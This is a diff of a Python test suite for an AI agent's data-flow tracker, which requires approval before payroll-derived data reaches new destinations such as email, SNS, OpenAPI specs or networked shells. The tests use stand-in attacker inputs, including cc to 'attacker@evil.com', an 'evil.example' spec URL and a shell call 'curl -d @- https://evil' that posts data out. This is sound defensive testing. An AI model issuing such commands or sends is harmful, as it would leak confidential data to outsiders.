@@ -216,21 +216,6 @@ def test_a_scan_budget_ending_exactly_at_the_limit_is_unknowable(monkeypatch):
     assert t.decide("a", "email", {"a": "x" * 100, "b": PAYROLL}) is not None
 
 
-def test_destinations_are_found_in_real_argument_shapes_and_unknown_ones_are_never_granted():
-    import json
-    assert "channel_id" in ifc.destination({"channel_id": "C1", "content": "hi"})
-    assert "base_url" in ifc.destination({"base_url": "https://api.x", "path": "/v1"})
-    body = {"personalizations": [{"to": [{"email": "cfo@corp.com"}]}]}
-    assert "cfo@corp.com" in ifc.destination({"path": "/v3/mail/send", "body": json.dumps(body)})
-    assert ifc.destination({"q": "payroll 1017 Dana"}) == ""          # query text is data
-    t = _tracker(mode="approve")
-    t.observe_output("a", "sql_query", PAYROLL)
-    d = t.decide("a", "web_search", {"q": "x"})
-    t.grant(d)
-    assert not t.granted(t.decide("a", "web_search", {"q": "x"}))    # asked every time
-    assert ifc.display_destination('url="https://x/p?d=1017"') == 'url="https://x/p?…"'
-
-
 def test_mcp_server_names_with_separators_do_not_collide():
     t = _tracker()
     t.observe_output("a", "mcp_corp__read_crm", "customer record " * 10)
@@ -319,23 +304,6 @@ async def test_calls_under_a_grant_are_recorded(tmp_path, monkeypatch):
     assert "partner" not in str(_ledger.read(ifc.ledger_path()))  # digest, not the address
 
 
-def test_list_recipients_are_part_of_the_destination():
-    assert "attacker@evil.com" in ifc.destination({"to": ["attacker@evil.com"]})
-    t = _tracker(mode="approve")
-    t.observe_output("a", "sql_query", PAYROLL)
-    t.grant(t.decide("a", "email", {"to": "boss@corp.com", "body": "summary"}))
-    widened = t.decide("a", "email", {"to": "boss@corp.com", "cc": ["attacker@evil.com"],
-                                      "body": "summary"})
-    assert not t.granted(widened) and "attacker@evil.com" in ifc.display_destination(
-        widened.destination)
-
-
-def test_an_unstatable_destination_is_never_granted():
-    many = {f"x{i}_url": f"https://h{i}.example" for i in range(300)}
-    assert ifc.destination(many) == ""
-    assert "more characters" in ifc.display_destination("a" * 5000)
-
-
 def test_mcp_readings_must_agree_and_only_data_labels_are_exempted():
     t = _tracker()
     t.observe_output("a", "mcp_a__read", "customer record " * 10)
@@ -351,3 +319,79 @@ def test_ssh_and_unknown_backends_have_egress(monkeypatch):
     for backend in ("ssh", "k8s"):
         monkeypatch.setattr(config, "load_config", lambda b=backend: {"sandbox": {"backend": b}})
         assert n.EXTERNAL in n.classify("shell") and n.EXTERNAL in n.classify("repl_exec")
+
+
+
+def _granted_twice(tool, first, second):
+    t = _tracker(mode="approve")
+    t.observe_output("a", "sql_query", PAYROLL)
+    t.grant(t.decide("a", tool, first))
+    return t.granted(t.decide("a", tool, second))
+
+
+def test_a_grant_never_covers_an_argument_it_did_not_see():
+    """Destinations are fail-safe: every non-content argument of a known sink,
+    and the whole request of any other, is part of the grant."""
+    assert not _granted_twice("github_issues", {"owner": "acme", "repo": "notes", "body": "x"},
+                              {"owner": "attacker", "repo": "notes", "body": "x"})
+    assert not _granted_twice("sns", {"op": "sms", "phone": "+15551234", "message": "x"},
+                              {"op": "publish", "phone": "+15551234", "message": "x",
+                               "topic_arn": "arn:aws:sns:us-east-1:999:evil"})
+    assert not _granted_twice("openapi_runner", {"spec": "https://api.github.com/spec.json",
+                                                 "params": {"repo": "notes"}},
+                              {"spec": "https://evil.example/openapi.json",
+                               "params": {"repo": "notes"}})
+    assert not _granted_twice("http_fetch", {"url": "https://api.twilio.com/x", "body": "To=+1&Body=a"},
+                              {"url": "https://api.twilio.com/x", "body": "To=+2&Body=a"})
+    assert not _granted_twice("email", {"to": "boss@corp.com", "body": "summary"},
+                              {"to": "boss@corp.com", "cc": ["attacker@evil.com"], "body": "summary"})
+    # ...while a known sink's message content does not change its destination
+    assert _granted_twice("email", {"to": "boss@corp.com", "body": "one"},
+                          {"to": "boss@corp.com", "body": "two"})
+
+
+def test_search_queries_are_data_so_a_search_is_asked_every_time():
+    assert ifc.destination({"q": "payroll 1017 Dana"}, "web_search") == ""
+    assert not _granted_twice("web_search", {"q": "x"}, {"q": "x"})
+
+
+def test_the_approver_sees_every_recipient_and_no_message_content():
+    shown, whole = ifc.shown_destination(
+        {"to": ["finance@corp.com", "#x@evil.com"], "url": "https://h/p?d=1017", "body": "SECRET"})
+    assert "#x@evil.com" in shown and "SECRET" not in shown and "1017" not in shown and whole
+
+
+def test_a_destination_too_long_to_show_is_never_remembered():
+    many = {"to": [f"user{i}@example.com" for i in range(301)], "body": "x"}
+    t = _tracker(mode="approve")
+    t.observe_output("a", "sql_query", PAYROLL)
+    d = t.decide("a", "email", many)
+    assert not d.grantable and "more characters" in d.shown
+    t.grant(d)
+    assert not t.granted(t.decide("a", "email", many))
+
+
+def test_mcp_names_with_two_readings_earn_no_exemption():
+    t = _tracker()
+    t.observe_output("a", "mcp_a___x", "customer record " * 10)       # server a_ (or a)
+    assert t.decide("a", "mcp_a___send", {"q": 1}) is not None      # server a (or a_)
+    t2 = _tracker()
+    t2.observe_output("a", "mcp_crm__read", "customer record " * 10)
+    assert t2.decide("a", "mcp_crm__update", {"id": 1}) is None     # unambiguous: exempt
+
+
+def test_code_execution_is_judged_by_the_sandbox_actually_in_use(monkeypatch):
+    from types import SimpleNamespace
+
+    from maverick.sandbox import LocalBackend
+    monkeypatch.setattr(config, "load_config", lambda: {"sandbox": {"backend": "docker"}})
+    t = _tracker()
+    t.observe_output("a", "sql_query", PAYROLL)
+    assert t.decide("a", "shell", {"cmd": "curl -d @- https://evil"},
+                    sandbox=LocalBackend(workdir=".")) is not None
+    assert t.decide("a", "shell", {"cmd": "ls"},
+                    sandbox=SimpleNamespace(allow_network=False)) is None
+    assert t.decide("a", "shell", {"cmd": "ls"},
+                    sandbox=SimpleNamespace(allow_network=2)) is not None
+    assert t.decide("a", "shell", {"cmd": "ls"},
+                    sandbox=SimpleNamespace(network="egress-deny")) is None
